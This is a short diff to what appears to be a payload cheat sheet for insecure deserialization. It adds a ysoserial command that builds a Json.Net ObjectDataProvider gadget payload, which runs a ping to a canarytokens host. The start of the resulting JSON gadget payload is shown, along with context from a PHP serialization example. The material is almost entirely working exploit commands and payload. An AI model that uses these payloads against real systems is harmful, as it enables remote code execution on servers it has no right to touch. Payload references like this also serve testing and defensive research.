@@ -25,6 +25,12 @@ Payload:
 #####
 
 ## C# - Newtonsoft
+Run:
+```sh
+ysoserial.exe -g ObjectDataProvider -f Json.Net -c "ping -n 3   XXXXXXXXX.canarytokens.com"
+```
+
+Payload:
 ```sh
 {
     '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
@@ -53,6 +59,7 @@ print((serialize(new Example2)) . "\n");
 
 ?>
 ```
+
 Run:
 ```sh
 php serialize.php
